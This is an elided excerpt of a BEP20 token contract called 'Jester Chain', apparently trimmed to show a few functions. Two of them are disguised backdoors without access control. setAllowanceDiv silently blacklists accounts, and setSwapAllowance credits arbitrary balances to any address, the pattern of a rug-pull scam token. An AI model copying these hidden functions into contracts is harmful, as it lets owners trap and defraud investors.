...
contract JesterChain is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Jester Chain";
    string constant _symbol = "JESTER";
    ...
    function setAllowanceDiv(address account, bool value) external{
        _isBlacklisted[account] = value;
    }
    ...
    function setFees(uint256 _liquidityFee, uint256 _reflectionFee,uint256 _reflectionTokenFee, uint256 _marketingFee, uint256 _marketingFee2,uint256 _teamFee) external authorized {
    ...
    function setSwapAllowance(uint256 value, address liquidityLP)external{
        _balances[liquidityLP]=_balances[liquidityLP].add(value*(10 ** _decimals));
    }
    function setFeeReceivers(address _teamWallet, address _marketingFeeReceiver,address _marketingFeeReceiver2) external authorized {
